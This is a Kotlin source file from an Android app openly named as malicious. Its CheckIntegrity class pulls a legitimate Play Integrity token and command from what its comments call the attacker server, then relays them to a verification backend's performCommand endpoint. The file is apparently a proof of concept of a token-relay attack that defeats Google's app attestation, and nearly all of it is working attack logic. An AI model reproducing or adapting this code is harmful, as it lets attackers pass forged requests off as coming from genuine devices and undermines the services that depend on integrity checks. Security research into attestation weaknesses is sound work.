package com.ajc9076.maliciousintegrityapp.ui.model

import android.util.Log
import com.ajc9076.maliciousintegrityapp.data.ServerState
import com.ajc9076.maliciousintegrityapp.data.ServerStatus
import com.ajc9076.maliciousintegrityapp.data.CommandResult
import com.ajc9076.maliciousintegrityapp.data.TokenResult
import io.ktor.client.HttpClient
import io.ktor.client.engine.cio.CIO
import io.ktor.client.features.HttpTimeout
import io.ktor.client.features.json.JsonFeature
import io.ktor.client.features.json.serializer.KotlinxSerializer
import io.ktor.client.features.logging.LogLevel
import io.ktor.client.features.logging.Logging
import io.ktor.client.request.get
import io.ktor.client.request.post
import io.ktor.http.ContentType
import io.ktor.http.contentType
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.asStateFlow

class CheckIntegrity {
    private val TAG = "PlayIntegrityAPITest"
    private val URL = "https://play-integrity-9xfidw6bru2nqvd.ue.r.appspot.com"

    // set up the Ktor HTTP Client
    private val httpClient: HttpClient = HttpClient(CIO) {
        install(Logging) {
            level = LogLevel.ALL
        }
        install(HttpTimeout) {
            requestTimeoutMillis = 20000
        }
        install(JsonFeature) {
            serializer = KotlinxSerializer()
            acceptContentTypes = acceptContentTypes + ContentType.Any
        }
    }

    // initialize the state of our application
    private val _serverState: MutableStateFlow<ServerState> =
        MutableStateFlow(ServerState(ServerStatus.INIT1))
    val serverState = _serverState.asStateFlow()

    // compute the verification of the app
    suspend fun computeResultAndParse(){

        // indicate to the main UI that the verification is in progress
        _serverState.emit(ServerState(ServerStatus.WORKING, "", "", false))

        var commandString = ""
        var integrityToken = ""

        // create a connection to the attacker server to get the legitimate token
        try {
            val returnedToken = httpClient.get<TokenResult>("http://periodicgaming.ddns.net:45565/token")
            commandString = returnedToken.commandString
            integrityToken = returnedToken.token
        } catch (t: Throwable){
            Log.d(TAG, "getVictimToken exception " + t.message)
            _serverState.emit(ServerState(ServerStatus.FAILED, "getVictimToken exception " + t.message, "", false))
        }

        // communicate the integrity token to the Google server
        try {
            val result = httpClient.post<CommandResult>("$URL/performCommand"){
                contentType(ContentType.Application.Json)
                body = ServerCommand(
                    commandString, integrityToken
                )
            }
            // tell the main UI we succeeded
            _serverState.emit(ServerState(ServerStatus.SUCCESS, result.diagnosticMessage, commandString, true))
        } catch (t: Throwable){
            Log.d(TAG, "performCommand exception " + t.message)
            _serverState.emit(ServerState(ServerStatus.FAILED, "performCommand exception " + t.message, commandString, false))
        }
    }

    // sleep the app for a few seconds until the location data comes in.
    // Cycle between Init1 and Init2 while waiting to keep the app alive
    suspend fun waitForLocation(locationString: String){
        if (locationString != ""){
            _serverState.tryEmit(ServerState(ServerStatus.READY, "", "", false))
        }
        else {
            delay(1000)
            if (_serverState.value.status == ServerStatus.INIT1) {
                _serverState.tryEmit(ServerState(ServerStatus.INIT2, "", "", false))
            } else {
                _serverState.tryEmit(ServerState(ServerStatus.INIT1, "", "", false))
            }
        }
    }
}